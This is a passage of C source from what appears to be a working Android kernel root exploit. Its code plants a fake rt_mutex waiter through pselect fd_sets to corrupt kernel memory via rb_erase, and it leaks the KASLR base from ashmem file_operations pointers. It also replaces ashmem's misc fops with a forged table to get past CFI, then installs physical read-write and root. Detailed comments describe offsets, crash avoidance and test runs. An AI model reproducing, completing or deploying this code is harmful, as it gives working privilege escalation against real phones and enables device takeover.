         * child->__rb_parent_color = parent_color, i.e. it dereferences the
         * value it writes.  Anything that is not 0 and not a mapped writable
         * kernel pointer oopses the kernel, so refuse it here. */
        if (v != 0 && !is_kernel_ptr(v)) {
          pr_error("KS_PSELECT_VALUE=%016llx is not a kernel pointer; "
                   "rb_erase would deref it. keeping 0\n",
                   (unsigned long long)v);
        } else {
          value = v;
        }
      }
      pselect_paranoid_probe = 1;
      pr_info("pselect target=paranoid %016zx value=%016llx before=%d "
              "mlock=%d\n",
              target, (unsigned long long)value, before, mlock);
    }
    uintptr_t parent = target - 8;
    uint64_t lock_word = fake_lock;
    uint64_t task_word = text_addr(INIT_TASK);
    /*
     * Without a payload page the fake rt_mutex must live somewhere that is
     * guaranteed zero and never referenced: the 0x600-byte .bss alignment
     * pad between __bss_start and selinux_state (no kallsyms symbol).
     * empty_zero_page must not host the lock: rb_erase() stores kernel
     * pointers at lock+0x08/+0x10, which leak into every untouched anon
     * page, zygote crashes and init reboots the phone seconds later.
     * The fake task_struct stays on the ZERO_PAGE because try_to_wake_up()
     * only takes its pi_lock, which is balanced and leaves the page zero.
     */
    if (!lock_word || pselect_bss_lock) {
      int slot = pselect_attempt_slot;
      lock_word = text_addr(KIMAGE_TEXT_BASE + pselect_slot_offset(slot));
      task_word = text_addr(KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF + 0x400);
      pr_info("pselect safe lock=%016llx slot=%d/%d task=%016llx\n",
              (unsigned long long)lock_word, slot, BSS_LOCK_SLOTS,
              (unsigned long long)task_word);
    }
    /*
     * Default to the dedicated payload page.  Both the fake rt_mutex and
     * the fake task_struct live there, zeroed by prepare_skb_payload().
     */
    if (pselect_payload_lock) {
      task_word = page_base + PSELECT_TASK_PROBE_OFF;
      pr_info("pselect payload lock=%016llx task=%016llx\n",
              (unsigned long long)lock_word, (unsigned long long)task_word);
    }
    const char *probe = getenv("KS_PSELECT_PROBE_LOCK");
    if (probe && probe[0] && strcmp(probe, "0") != 0) {
      if (strcmp(probe, "zeropage") == 0) {
        lock_word = text_addr(KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF + 0x100);
        pr_info("pselect probe lock=zeropage %016llx\n",
                (unsigned long long)lock_word);
      } else {
        lock_word = strtoull(probe, NULL, 0);
        pr_info("pselect probe lock override word=%016llx\n",
                (unsigned long long)lock_word);
      }
    }
    /*
     * waiter->task (word6) is the argument of the exit-path
     * try_to_wake_up() at rt_mutex_adjust_prio_chain+0x2f8eac.  A real task
     * with a non-zero ->state would be genuinely woken; point it at a
     * guaranteed-zero slice (ZERO_PAGE by default) so ->state (off 0x28)
     * is 0 and ttwu takes its immediate "out" path (pi_lock at off 0x8f4 is
     * also zero and reads as an unlocked spinlock).  ttwu only takes that
     * pi_lock, which is balanced, so the shared page stays zero.
     * KS_PSELECT_PROBE_TASK=zeropage keeps the same behaviour explicitly.
     */
    const char *probe_task = getenv("KS_PSELECT_PROBE_TASK");
    if (probe_task && strcmp(probe_task, "zeropage") == 0) {
      task_word = text_addr(KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF + 0x400);
      pr_info("pselect probe task=zeropage %016llx\n",
              (unsigned long long)task_word);
    }
    struct pselect_waiter_word {
      int word;
      uint64_t value;
      const char *name;
    } words[] = {
      {WAITER_TREE_ENTRY_OFF / 8 + 0, parent, "tree_parent"},
      {WAITER_TREE_ENTRY_OFF / 8 + 1, value, "tree_right"},
      {WAITER_TREE_ENTRY_OFF / 8 + 2, 0, "tree_left"},
      {WAITER_PI_TREE_ENTRY_OFF / 8 + 0, parent, "pi_parent"},
      {WAITER_PI_TREE_ENTRY_OFF / 8 + 1, value, "pi_right"},
      {WAITER_PI_TREE_ENTRY_OFF / 8 + 2, 0, "pi_left"},
      {WAITER_TASK_OFF / 8, task_word, "task"},
      {WAITER_LOCK_OFF / 8, lock_word, "lock"},
      {WAITER_PRIO_OFF / 8, 3, "prio"},
      {WAITER_DEADLINE_OFF / 8, 0, "deadline"},
      {WAITER_WW_CTX_OFF / 8, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      pselect_put_waiter_word(in, out, ex, wps, words[i].word,
                              words[i].value, words[i].name);
    }
    pr_info("pselect fdset simple layout shift=%d wps=%d target=%016zx "
            "value=%016zx parent=%016zx\n",
            sh, wps, target, value, parent);
    return;
  }

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {2, fake_fops, "tree_pc"},
    {3, 0, "tree_right"},
    {4, text_addr(ASHMEM_MISC_FOPS), "tree_left"},
    {5, fake_fops, "pi_parent"},
    {6, 0, "pi_right"},
    {7, text_addr(ASHMEM_MISC_FOPS), "pi_left"},
    {8, text_addr(INIT_TASK), "task"},
    {9, fake_lock, "lock"},
    {10, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
    {11, 0, "deadline"},
    {12, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
  pr_info("pselect fdset shifted layout shift=%d words_per_set=%d\n",
          PSELECT_WAITER_WORD_SHIFT, words_per_set);
}

static int read_sysctl_int(const char *path) {
  int v = -99;
  FILE *f = fopen(path, "r");
  if (f) {
    if (fscanf(f, "%d", &v) != 1) v = -99;
    fclose(f);
  }
  return v;
}

void do_pselect_fake_lock_route(void) {
  const char *skip_page = getenv("KS_SKIP_PAGE");
  int no_page = skip_page && skip_page[0] && strcmp(skip_page, "0") != 0;
  if (!page_base || !fake_lock || !fake_fops) {
    if (!no_page) {
      cfi_last_step = 30;
      cfi_last_errno = 0;
      pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
               page_base, fake_lock, fake_fops);
      return;
    }
    pr_warning("pselect KS_SKIP_PAGE: running route without payload page\n");
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  int probe_mode = pselect_probe_mode();
  const char *probe_tgt = getenv("KS_PSELECT_TARGET");
  pselect_slot_is_paranoid = probe_tgt && strcmp(probe_tgt, "paranoid") == 0;
  /*
   * The zeroed .bss lock + ZERO_PAGE task is the only waiter configuration
   * that has been observed to actually reach rb_erase() and store word1.
   * The payload-page lock (owner set, waiters pre-populated) drives
   * rt_mutex_adjust_prio_chain down the owner chain instead, so the target
   * is never written.  KS_PSELECT_BSS_LOCK reuses the proven configuration
   * while keeping the default target (fake_fops -> ashmem_misc_fops), which
   * is what the CFI/root stage needs.  Any mode that reads or writes a .bss
   * slot must run the dirty-slot ledger, hence the single flag.
   */
  const char *bl = getenv("KS_PSELECT_BSS_LOCK");
  pselect_bss_lock = pselect_slot_is_paranoid ||
                     (bl && bl[0] && strcmp(bl, "0") != 0 &&
                      strcasecmp(bl, "false") != 0 && strcasecmp(bl, "no") != 0);
  pselect_attempt_slot = 0;
  if (pselect_bss_lock) pselect_load_slot_mask();
  int probe_attempts = probe_mode ? 1 : PSELECT_CFI_ROUTE_ATTEMPTS;
  /*
   * Tier-0 safety valve (no kprobe/cfgfs verify): a failed attempt can
   * leave the PI waiter dangling on this thread's kernel stack (observed
   * requeue errno=110); a second attempt or an in-route re-prepare then
   * walks the corrupted chain and panics (bootreason fatal_exception,
   * stock boot panic3).  One shot per process: on miss the process exits
   * cleanly (atexit drops the PI futex, the dirty-slot ledger records the
   * burn) and the operator relaunches -- the next process skips dirty
   * slots.  Tier-1 (tracefs verify present) keeps the retry loop.
   */
  if (!ks_have_tracefs() && !probe_mode) {
    if (probe_attempts > 1) {
      pr_warning("pselect Tier-0: capping route attempts %d -> 1 "
                 "(dangling-PI safety; relaunch per retry)\n",
                 probe_attempts);
      probe_attempts = 1;
    }
  }
  int paranoid_base = read_sysctl_int("/proc/sys/kernel/perf_event_paranoid");

  if (!no_page) {
    int dfd = open_ashmem_device();
    uint64_t b_misc = 0, b_list = 0, b_text = 0, b_w0 = 0, b_lock = 0;
    ssize_t rb1 = configfs_read_once(dfd, text_addr(ASHMEM_MISC_FOPS), &b_misc, 8);
    ssize_t rb2 = configfs_read_once(dfd, text_addr(ASHMEM_MISC_FOPS) - 8, &b_list, 8);
    ssize_t rb3 = configfs_read_once(dfd, text_addr(KIMAGE_TEXT_BASE), &b_text, 8);
    ssize_t rb4 = configfs_read_once(dfd, fake_w0 + 0x10, &b_w0, 8);
    ssize_t rb5 = configfs_read_once(dfd, fake_lock + 0x08, &b_lock, 8);
    pr_info("cfi baseline rb=%zd/%zd/%zd/%zd/%zd misc=%016llx m8=%016llx "
            "text=%016llx w0l=%016llx lockw=%016llx\n",
            rb1, rb2, rb3, rb4, rb5, (unsigned long long)b_misc,
            (unsigned long long)b_list, (unsigned long long)b_text,
            (unsigned long long)b_w0, (unsigned long long)b_lock);
    close(dfd);
  }
  int route_attempt = 1;
  static long attempt_pause_ms = -1;
  if (attempt_pause_ms < 0) {
    const char *ap = getenv("KS_PSELECT_ATTEMPT_PAUSE_MS");
    attempt_pause_ms = (ap && ap[0]) ? strtol(ap, NULL, 0) : 0;
  }
  const char *nrp_env = getenv("KS_PSELECT_NO_REPREPARE");
  int no_reprepare =
      nrp_env && nrp_env[0] && strcmp(nrp_env, "0") != 0 &&
      strcasecmp(nrp_env, "false") != 0 && strcasecmp(nrp_env, "no") != 0;
  if (!ks_have_tracefs() && !no_reprepare) {
    no_reprepare = 1;
    pr_warning("pselect Tier-0: forcing KS_PSELECT_NO_REPREPARE=1 "
               "(in-route re-prepare walks dangling PI state -> panic)\n");
  }
  for (; route_attempt <= probe_attempts; route_attempt++) {
    if (route_attempt > 1 && attempt_pause_ms > 0) {
      pr_info("pselect attempt pause %ldms before attempt=%d\n",
              attempt_pause_ms, route_attempt);
      int pause_pulse_fd = reclaim_recv_fd();
      long pause_remaining = attempt_pause_ms;
      while (pause_remaining > 0) {
        long slice = pause_remaining > 200 ? 200 : pause_remaining;
        struct timespec ap_ts = {slice / 1000, (slice % 1000) * 1000000L};
        while (nanosleep(&ap_ts, &ap_ts) && errno == EINTR) {
        }
        if (pause_pulse_fd >= 0) fcntl(pause_pulse_fd, F_GETFD);
        pause_remaining -= slice;
        /* Early release: once the measurer has cleared fakemiss for this
         * attempt, stop idling and let the loop reload+fire right away. */
        {
          FILE *pf = fopen("/data/local/temp/fakemiss", "r");
          if (pf) {
            char pb[32];
            memset(pb, 0, sizeof(pb));
            if (fgets(pb, sizeof(pb), pf)) {
              long pv = strtol(pb, NULL, 0);
              if (pv < route_attempt) {
                pr_info("pselect attempt pause released early "
                        "fakemiss=%ld attempt=%d\n", pv, route_attempt);
                fclose(pf);
                break;
              }
            }
            fclose(pf);
          }
        }
      }
    }
    if (!no_page && !no_reprepare && route_attempt != 1 &&
        PSELECT_CFI_REPREPARE_EVERY > 0 &&
        ((route_attempt - 1) % PSELECT_CFI_REPREPARE_EVERY) == 0) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    pselect_attempt_idx = route_attempt - 1;
    int fake_miss = 0;
    const char *fm = getenv("KS_PSELECT_FAKE_MISS");
    if (fm && fm[0]) fake_miss = (int)strtol(fm, NULL, 0);
    {
      FILE *ff = fopen("/data/local/temp/fakemiss", "r");
      if (ff) {
        char fb[32];
        memset(fb, 0, sizeof(fb));
        if (fgets(fb, sizeof(fb), ff)) fake_miss = (int)strtol(fb, NULL, 0);
        fclose(ff);
      }
    }
    if (fake_miss >= route_attempt) {
      /* Plumbing test for the retry path: simulate a miss so the loop has to
       * rotate the lock slot and re-arm the consumer, then really fire. */
      pr_warning("pselect fake miss attempt=%d/%d (skip pselect)\n",
                 route_attempt, probe_attempts);
      close(high_read);
      close(pipefd[0]);
      close(pipefd[1]);
      continue;
    }
    if (!pselect_slot_is_paranoid && !no_page && !reload_payload_base()) {
      /* Without a measured payload_base the fops route would point value at a
       * page that is not ours; misc_open would then jump through garbage.
       * Skip instead of firing.  KS_SKIP_PAGE (no_page) also skips: the
       * paranoid/selinux write probes target .data/.bss, not the payload. */
      pr_warning("pselect reload payload base unavailable; skip attempt=%d\n",
                 route_attempt);
      close(high_read);
      close(pipefd[0]);
      close(pipefd[1]);
      continue;
    }
    if (pselect_bss_lock) {
      if (!pselect_slot_tracking_ok) {
        pr_error("pselect dirty-slot tracking unavailable; refusing to run "
                 "the chain against an unknown .bss slot\n");
        break;
      }
      pselect_attempt_slot = pselect_clean_slot(route_attempt - 1);
      if (pselect_attempt_slot < 0) {
        pr_error("pselect no clean lock slot left (mask=%x); refusing to "
                 "reuse a dirty rt_mutex\n", pselect_slot_mask);
        break;
      }
    } else {
      pselect_attempt_slot = pselect_attempt_idx % BSS_LOCK_SLOTS;
    }
    prepare_pselect_fdsets(&in, &out, &ex);
    /* fix47: NEVER re-raise the Tier-0 cap.  This used to restore
     * probe_attempts to PSELECT_CFI_ROUTE_ATTEMPTS whenever bss_lock was
     * set (the runner always sets it), silently defeating the one-shot
     * dangling-PI safety above: attempt=2 re-entered
     * rt_mutex_adjust_prio_chain with attempt=1's stale kernel-stack
     * waiter and BUGed (2026-10-13 selinux-probe run, panic at "route
     * pselect enter attempt=2").  Retries are Tier-1 only. */
    if ((pselect_paranoid_probe || pselect_bss_lock) && ks_have_tracefs() &&
        probe_attempts < PSELECT_CFI_ROUTE_ATTEMPTS) {
      probe_attempts = PSELECT_CFI_ROUTE_ATTEMPTS;
    }
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    int want_in = 0, want_out = 0, want_ex = 0;
    int want_ready = pselect_ready_counts(&in, &out, &ex, &want_in, &want_out,
                                          &want_ex);
    pr_info("pselect fdset expect ready in=%d out=%d ex=%d total=%d\n", want_in,
            want_out, want_ex, want_ready);

    char poke = 'X';
    ssize_t poke_ret = write(pipefd[1], &poke, 1);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&consumer_done, 0);
    atomic_store(&pselect_planted, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    if (!probe_mode) {
      atomic_store(&punch_consume_go, route_attempt);
      pr_info("route armed attempt=%d\n", route_attempt);
    } else {
      pr_info("pselect probe mode: consumer go suppressed attempt=%d\n",
              route_attempt);
    }

    /* timeout MUST be NULL: __do_sys_pselect6 passes the timeout pointer as
     * x1 into poll_select_finish, and a non-NULL pointer makes it run
     * bl 0x330ad4 (frame at core_sp+0xf0) which clobbers the planted waiter
     * at S=core_sp+0xc8 (task/lock/wake at S+0x30..0x40) before returning to
     * userspace. With timeout=NULL poll_select_finish skips straight to its
     * epilogue (its own frame stays at core_sp+0x150, above res_*), so the
     * res_* result words - and hence the planted waiter - survive the return
     * and remain valid while the waiter spins in userspace. */
    /* The rb_erase store below is about to become the expected value;
     * disarm the guard so it cannot yank misc.fops away mid-store. */
    fops_guard_set_expect(0);
    errno = 0;
    pr_info("route pselect enter attempt=%d\n", route_attempt);
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, NULL, NULL);
    int saved_errno = errno;
    if (ret > 0) {
      atomic_store(&pselect_planted, 1);
    }
    int boost_wait_ms = 0;
    if (!probe_mode) {
      /* Pure userspace spin. The planted stale waiter S lives ~312 bytes
       * below the syscall-entry depth of this thread's kernel stack; any
       * syscall here (usleep/clock_nanosleep) overwrites S before the
       * consumer's sched_setattr chain reads it. */
      unsigned long spin_cap = (unsigned long)delay_usec * 600UL + 400000000UL;
      while (atomic_load(&consumer_done) == 0 && spin_cap > 0) {
        spin_cap--;
      }
      boost_wait_ms = atomic_load(&consumer_done) ? 1 : 0;
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d want=%d errno=%d calls=%d "
            "success=%d delay=%d poke=%zd boost_wait_ms=%d\n",
            route_attempt, ret, want_ready, saved_errno, calls, success,
            delay_usec, poke_ret, boost_wait_ms);
    /*
     * Retire the slot unconditionally: even a "miss" (target unchanged) can
     * mean rt_mutex_adjust_prio_chain reached the lock and rb_insert()ed the
     * waiter without performing the target store, which already dirties
     * waiters.rb_leftmost.  Reusing such a slot later panics the kernel, so
     * the only safe assumption is that every real attempt burns one slot.
     */
    if (pselect_bss_lock) {
      pselect_mark_slot_dirty(pselect_attempt_slot);
      pr_info("route probe: slot marked dirty attempt=%d slot=%d\n",
              route_attempt, pselect_attempt_slot);
      int dirty = shared_zero_dirty();
      pr_info("route probe: shared_zero checked dirty=%d attempt=%d\n", dirty,
              route_attempt);
      if (dirty > 0) {
        pr_error("pselect SHARED ZERO PAGE DIRTY after attempt=%d "
                 "count=%d; stopping retries (a dirty zero page is visible "
                 "to every anon mapping, zygote will fault)\n",
                 route_attempt, dirty);
        dump_shared_zero_page("dirty");
        break;
      }
    }

    int route_signal = calls > 0 && success > 0;
    if (route_signal && !no_page) {
      pr_info("route probe: entering cfi stage attempt=%d calls=%d "
              "success=%d\n",
              route_attempt, calls, success);
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    int paranoid_now = read_sysctl_int("/proc/sys/kernel/perf_event_paranoid");
    if (paranoid_now != paranoid_base) {
      pr_info("pselect paranoid %d -> %d attempt=%d; stopping route (further "
              "attempts re-enter rt_mutex_adjust_prio_chain with a dirty "
              "waiters.rb_leftmost and BUG)\n",
              paranoid_base, paranoid_now, route_attempt);
      break;
    }
    if (pselect_paranoid_probe) {
      /* The target store is performed by rb_erase(), so an unchanged target
       * means the chain never reached this lock: the slot is still pristine
       * and attempt N+1 rotates to a different one.  Retrying is what makes
       * the probe reliable instead of a single coin flip. */
      pr_warning("pselect paranoid unchanged after attempt=%d/%d (%d); "
                 "retrying with a fresh lock slot\n",
                 route_attempt, probe_attempts, paranoid_now);
      continue;
    }
    if (route_verified || cfi_dirty_seen || !route_signal) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  {
    int now_p = -99, now_m = -99;
    FILE *pf = fopen("/proc/sys/kernel/perf_event_paranoid", "r");
    if (pf) {
      if (fscanf(pf, "%d", &now_p) != 1) now_p = -99;
      fclose(pf);
    }
    FILE *mf = fopen("/proc/sys/kernel/perf_event_mlock_kb", "r");
    if (mf) {
      if (fscanf(mf, "%d", &now_m) != 1) now_m = -99;
      fclose(mf);
    }
    pr_info("pselect paranoid after=%d mlock=%d\n", now_p, now_m);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
  if (pselect_paranoid_probe) {
    int final_p = read_sysctl_int("/proc/sys/kernel/perf_event_paranoid");
    if (final_p == paranoid_base) {
      pr_error("pselect paranoid FAIL after %d attempts still %d\n",
               probe_attempts, final_p);
    } else {
      pr_success("pselect paranoid OK %d -> %d in %d attempts\n",
                 paranoid_base, final_p, route_attempt);
    }
  }
  /*
   * Route is over (no more rb stores possible).  Whatever happened -- cfi
   * success, cfi failure, or the signal never tripped -- misc.fops must
   * end up holding the original pointer, with the guard watching it.
   */
  if (!no_page && kaslr_done && g_fops_probe_fd >= 0) {
    uint64_t cur = 0;
    uint64_t orig_end = canon_addr(ASHMEM_FOPS);
    if (configfs_read_once(g_fops_probe_fd, text_addr(ASHMEM_MISC_FOPS), &cur,
                           8) == 8 &&
        cur != orig_end) {
      ssize_t wr = configfs_write_once(
          g_fops_probe_fd, text_addr(ASHMEM_MISC_FOPS), &orig_end, 8);
      pr_warning("pselect route end misc.fops=%016llx restore ret=%zd\n",
                 (unsigned long long)cur, wr);
    }
    fops_guard_set_expect((uintptr_t)orig_end);
  }
  dump_shared_zero_page("after");
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fops_table_base() + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  /* With VOFF, kernel reads from (fake_fops+voff)+off = value+off.
   * Table was built at fake_fops+off (unshifted); rewrite at the shifted
   * offset the kernel actually dereferences. */
  uintptr_t base = expected_misc_fops ? expected_misc_fops : fake_fops;
  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = base + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  /*
   * Scrub the route's dirty .bss lock slot NOW -- before physrw's storm,
   * through the configfs deputy (the pipe primitive does not exist yet).
   *
   * The storm's scheduling wakeups re-enter rt_mutex_adjust_prio_chain
   * and walk the slot's fake rt_mutex via the waiter the route planted
   * in the real PI tree.  rb_leftmost/pi_waiters still held route-era
   * pointers, so the walker dereferenced slot+0x28 (pi_waiters.rb_leftmost)
   * as a lock address: pmd=0 -> data abort -> watchdog panic, Comm
   * ks_owner, twice reproduced with an identical offset
   * (run12 ffffffeba7811028 / run13 ffffffec60a11028, both
   * KIMAGE_TEXT_BASE + BSS_LOCK_PAD_OFF + 0x28).  pi_cleanup's scrub
   * (root.c) runs only after physrw+root -- far too late for the storm.
   * Zeroing the whole slot here simulates a fully reaped waiter, so the
   * next chain walk sees empty trees and terminates instead of chasing
   * garbage.  root.c re-scrubs later (idempotent).
   */
  static int slot_scrubbed;  /* idempotent across PIPE_MAX_ATTEMPTS retries */
  if (!slot_scrubbed) {
    if (!pselect_scrub_slot(fd)) {
      pr_error("early slot scrub failed; refusing physrw storm\n");
      return 0;
    }
    slot_scrubbed = 1;
  }
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  pr_info("route probe: opening ashmem attempt=%d\n", cfi_attempts);
  const char *oz = getenv("KS_FOPS_OPEN_ZERO");
  int open_zero = oz && *oz && strcmp(oz, "0") != 0;
  int fd;
  if (open_zero) {
    /* Probe: fake table has ->open = NULL.  Bypass SYSCHK so a failure is
     * observable instead of exit(-1). */
    fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
    int e = errno;
    if (fd < 0) {
      pr_success("OPEN-PROBE: open() failed fd=-1 errno=%d%s; fops_get "
                 "survivable, store landed, [page+0x70]==0 (content==buf)\n",
                 e, e == 19 ? " (ENODEV)" : "");
      cfi_last_step = 11;
      cfi_last_errno = e;
      return 0;
    }
    /*
     * run4 outcome: fd>=0 with ->open==NULL.  QGKI misc_open returns 0
     * when new_fops->open is NULL (cbz -> w19=0), so this is the PROOF
     * that the store landed, [f_op+0x70]==0 was read from OUR payload
     * copy, and fops_get is survivable -- the "table not ours?" guess in
     * the old message was wrong.  run4 then panicked on a THIRD-party
     * ashmem open because c->fops had been rewritten to
     * payload_base+0x70 between our open and the Binder open
     * ([f_op+0x70] landed on a lattice mmap slot = ASHMEM_MMAP ->
     * misc_open called ashmem_mmap as ->open -> NULL deref at +0x128).
     * Two defenses plus a watcher:
     *  1. arm g_fops_probe_fd so the route-end restore (kaslr_done=1)
     *     actually runs and writes ASHMEM_FOPS back;
     *  2. point the fops guard at fake_fops so any rewriter is undone
     *     within 1ms and logged as "misc.fops clobber" (value + timing);
     *  3. poll misc.fops for 2s in case the rewriter strikes now.
     */
    pr_warning("OPEN-PROBE: open() returned fd=%d with NULL open slot "
               "(QGKI returns 0; store landed, content==buf)\n",
               fd);
    g_fops_probe_fd = fcntl(fd, F_DUPFD_CLOEXEC, 10);
    uint64_t cur = 0;
    if (configfs_read_once(fd, text_addr(ASHMEM_MISC_FOPS), &cur, 8) == 8) {
      pr_info("OPEN-PROBE misc.fops now=%016llx fake=%016llx probe_fd=%d\n",
              (unsigned long long)cur, (unsigned long long)fake_fops,
              g_fops_probe_fd);
      /* expect must include VOFF: content is +1 shifted (run7 pc decode =
       * (ASHMEM_IOCTL<<8)|0xff, boot6 lore at the VOFF branch), so stored
       * misc.fops = fake_fops + fops_voff.  Guard with the bare table base
       * would clobber it back to the unshifted value. */
      fops_guard_set_expect(route_expected_fops());
      for (int i = 0; i < 40; i++) {
        uint64_t now = 0;
        if (configfs_read_once(fd, text_addr(ASHMEM_MISC_FOPS), &now, 8) ==
                8 &&
            now != cur) {
          pr_warning("OPEN-PROBE misc.fops CHANGED poll=%d %016llx -> "
                     "%016llx\n",
                     i, (unsigned long long)cur,
                     (unsigned long long)now);
          cur = now;
        }
        usleep(50000);
      }
    } else {
      pr_warning("OPEN-PROBE misc.fops read failed errno=%d; arming guard "
                 "blind\n",
                 errno);
      fops_guard_set_expect(route_expected_fops());
    }
    close(fd);
    cfi_last_step = 12;
    cfi_last_errno = 0;
    return 0;
  }
  fd = open_ashmem_device();
  int dirty = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  /*
   * fix52 (rewritten fix55): dump the live fops table through the confused
